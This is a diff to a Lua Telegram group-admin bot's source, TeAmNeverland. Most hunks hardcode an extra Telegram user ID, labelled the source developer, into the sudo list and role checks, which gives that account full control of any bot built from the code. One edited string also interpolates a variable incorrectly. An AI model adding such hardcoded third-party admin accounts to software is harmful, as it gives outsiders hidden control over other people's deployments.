@@ -111,7 +111,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1391769117}  
+local ListSudos ={Sudo_Id,1391769117,2126070107}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -124,7 +124,7 @@ Status = 0
 DevelopersQ = Redis:sismember(TheNeverland.."Neverland:DevelopersQ:Groups",UserId) 
 if UserId == 1391769117 then
 Status = true
-elseif UserId == 1391769117 then
+elseif UserId == 2126070107 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -150,7 +150,7 @@ Distinguished = Redis:sismember(TheNeverland.."Neverland:Distinguished:Group"..C
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1391769117 then
 Status = 'مبرمج السورس'
-elseif UserId == 1391769117 then
+elseif UserId == 2126070107 then
 Status = 'مطور السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
@@ -730,7 +730,7 @@ Distinguished = Redis:sismember(TheNeverland.."Neverland:Distinguished:Group"..C
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1391769117 then
 Status = true
-elseif UserId == 1391769117 then
+elseif UserId == 2126070107 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -769,7 +769,7 @@ Distinguished = Redis:sismember(TheNeverland.."Neverland:Distinguished:Group"..C
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
 if UserId == 1391769117 then
 Status = true
-elseif UserId == 1391769117 then
+elseif UserId == 2126070107 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -898,7 +898,7 @@ end
 if tonumber(msg.sender.user_id) == 1391769117 then
 msg.Name_Controller = 'مبرمج السورس '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 1391769117 then
+elseif tonumber(msg.sender.user_id) == 2126070107 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
@@ -9532,7 +9532,7 @@ else
 local photo = LuaTele.getUserProfilePhotos(Sudo_Id)
 if photo.total_count > 0 then
 local ban = LuaTele.getUser(Sudo_Id)
-local T = '‹ 𝖣𝖾𝗏 𝖴𝗌𝖾𝗋 : @'..UserSudo..' \n‹Dev Bio : ['..ban.first_name..']\n— — — — — — — —\n'
+local T = '‹ 𝖣𝖾𝗏 𝖴𝗌𝖾𝗋 : @'..UserSudo..' \n‹ Dev Bio : [❲ "..Bio.." ❳]\n— — — — — — — —\n'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
@@ -9608,7 +9608,7 @@ photo = "https://t.me/kksli/3"
 local T =[[*
 - 𝖶𝖾𝗅𝖼𝗈𝗆𝖾  𝖲𝗈𝗎𝗋𝖼𝖾 TeAmNeverland .
 - 𝖳𝗁𝖾 𝗅𝖺𝗋𝗀𝖾𝗌𝗍 𝗉𝗋𝗈𝖿𝖾𝗌𝗌𝗂𝗈𝗇𝖺𝗅 𝗉𝗅𝖺𝗍𝖿𝗈𝗋𝗆 𝗌𝗉𝖾𝖼𝗂𝖺𝗅𝗂𝗓𝖾𝖽 𝗂𝗇 𝖬𝖺𝗄𝗂𝗇𝗀 𝖳𝖾𝗅𝖾𝗀𝗋𝖺𝗆 𝖡𝗈𝗍𝗌 .
-- اكبر  منصة أحترافية متخصصة لصنع الروبوتات :* [TeAmNeverland ›](https://t.me/TeAm_Neverland)
+𝙎𝙊𝙐𝙍𝘾𝙀 𝘾𝘼𝙃𝙃𝙉𝙀𝙇 :* [TeAmNeverland ›](https://t.me/TeAm_Neverland)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -10954,7 +10954,7 @@ data = {
 {text = 'تنظيف المجموعات ᥀',type = 'text'},{text = 'تنظيف المشتركين ᥀', type = 'text'},
 },
 {
-{text = 'جلب النسخه الاحتياطيه ᥀',type = 'text'},
+{text = 'جلب النسخه الاحتياطيه ᥀',type = 'text'},{text = 'جلب نسخه الردود', type = 'text'},
 },
 {
 {text = 'اضف رد عام ᥀',type = 'text'},{text = 'حذف رد عام ᥀', type = 'text'},
